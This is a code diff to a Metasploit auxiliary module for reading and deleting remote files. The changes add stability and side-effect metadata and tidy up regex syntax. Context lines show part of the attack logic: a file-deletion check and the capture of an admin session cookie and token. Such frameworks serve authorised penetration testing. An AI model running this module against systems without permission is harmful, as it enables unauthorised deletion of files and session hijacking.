@@ -33,7 +33,12 @@ class MetasploitModule < Msf::Auxiliary
           ['Delete', { 'Description' => 'Delete remote file' }]
         ],
         'DefaultAction' => 'Read',
-        'DisclosureDate' => '2012-10-31'
+        'DisclosureDate' => '2012-10-31',
+        'Notes' => {
+          'Stability' => [OS_RESOURCE_LOSS],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -118,7 +123,7 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    if res && (res.code == 200) && res.body =~ (/View Log Files/)
+    if res && (res.code == 200) && res.body =~ /View Log Files/
       print_good("File #{file} deleted")
     else
       print_error("Error deleting file #{file}")
@@ -167,7 +172,7 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    if res && (res.code == 303) && res.headers['Location'] =~ (/_h=([a-f0-9]*)/)
+    if res && (res.code == 303) && res.headers['Location'] =~ /_h=([a-f0-9]*)/
       @token = ::Regexp.last_match(1)
       if res.get_cookies =~ /_hadmin=([a-f0-9]*)/
         @session = ::Regexp.last_match(1)
